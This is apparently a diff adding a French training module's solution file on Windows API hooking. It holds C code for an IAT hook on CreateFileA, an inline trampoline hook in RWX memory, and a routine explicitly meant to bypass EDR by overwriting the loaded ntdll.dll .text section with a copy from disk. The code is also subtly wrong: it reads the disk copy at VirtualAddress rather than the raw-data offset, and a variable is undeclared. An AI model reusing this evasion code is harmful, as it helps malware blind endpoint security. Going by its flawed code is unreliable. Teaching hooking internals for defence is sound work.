@@ -1,0 +1,110 @@
+═══════════════════════════════════════════════════════════════════════════
+            MODULE 26 : API HOOKING - SOLUTIONS
+═══════════════════════════════════════════════════════════════════════════
+
+SOLUTION EXERCICE 1 : IAT Hook sur CreateFileA
+─────────────────────────────────────────────────────────────────────────────
+
+// Hook function
+HANDLE WINAPI hooked_CreateFileA(
+    LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
+    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
+    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile
+) {
+    printf("[HOOK] CreateFileA appelé: %s\n", lpFileName);
+
+    // Appeler l'original
+    typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+    pCreateFileA orig = (pCreateFileA)original_CreateFileA;
+
+    return orig(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
+                dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
+}
+
+// Installation
+iat_hook_function("kernel32.dll", "CreateFileA", hooked_CreateFileA, &original_CreateFileA);
+
+═══════════════════════════════════════════════════════════════════════════
+
+SOLUTION EXERCICE 2 : Inline Hook avec Trampoline
+─────────────────────────────────────────────────────────────────────────────
+
+// Créer une trampoline
+LPVOID create_trampoline(LPVOID original, BYTE* saved_bytes) {
+    // Allouer de la mémoire RWX pour la trampoline
+    LPVOID trampoline = VirtualAlloc(NULL, 64, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    // Copier les bytes originaux
+    memcpy(trampoline, saved_bytes, 5);
+
+    // Ajouter un JMP vers le reste de la fonction
+    BYTE* ptr = (BYTE*)trampoline + 5;
+    *ptr = 0xE9;  // JMP
+    *(DWORD*)(ptr + 1) = (DWORD)((BYTE*)original + 5 - (ptr + 5));
+
+    return trampoline;
+}
+
+// Hook avec trampoline
+LPVOID trampoline = create_trampoline(target, saved_bytes);
+inline_hook_function(target, hook_function, &hook_info);
+
+// Dans le hook, appeler le trampoline pour exécuter l'original
+
+═══════════════════════════════════════════════════════════════════════════
+
+SOLUTION EXERCICE 4 : API Unhooking (Bypass EDR)
+─────────────────────────────────────────────────────────────────────────────
+
+BOOL unhook_ntdll(void) {
+    // Charger une copie propre de ntdll.dll depuis le disque
+    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ,
+                               FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    LPVOID clean_ntdll = malloc(fileSize);
+    ReadFile(hFile, clean_ntdll, fileSize, &bytesRead, NULL);
+    CloseHandle(hFile);
+
+    // Récupérer ntdll chargé en mémoire
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+
+    // Parser et comparer .text section
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)clean_ntdll;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)clean_ntdll + dosHeader->e_lfanew);
+
+    // Trouver la section .text
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)section->Name, ".text") == 0) {
+            // Restaurer la section .text
+            DWORD oldProtect;
+            VirtualProtect((BYTE*)hNtdll + section->VirtualAddress,
+                          section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+            memcpy((BYTE*)hNtdll + section->VirtualAddress,
+                   (BYTE*)clean_ntdll + section->VirtualAddress,
+                   section->Misc.VirtualSize);
+
+            VirtualProtect((BYTE*)hNtdll + section->VirtualAddress,
+                          section->Misc.VirtualSize, oldProtect, &oldProtect);
+
+            printf("[+] ntdll.dll unhooké!\n");
+            break;
+        }
+        section++;
+    }
+
+    free(clean_ntdll);
+    return TRUE;
+}
+
+═══════════════════════════════════════════════════════════════════════════
+
+Pour les solutions complètes des exercices 3, 5-8, consultez :
+- PolyHook 2 : https://github.com/stevemk14ebr/PolyHook_2_0
+- MinHook : https://github.com/TsudaKageyu/minhook
+- Microsoft Detours : https://github.com/microsoft/Detours
+
+RAPPEL : Usage éducatif uniquement
+═══════════════════════════════════════════════════════════════════════════
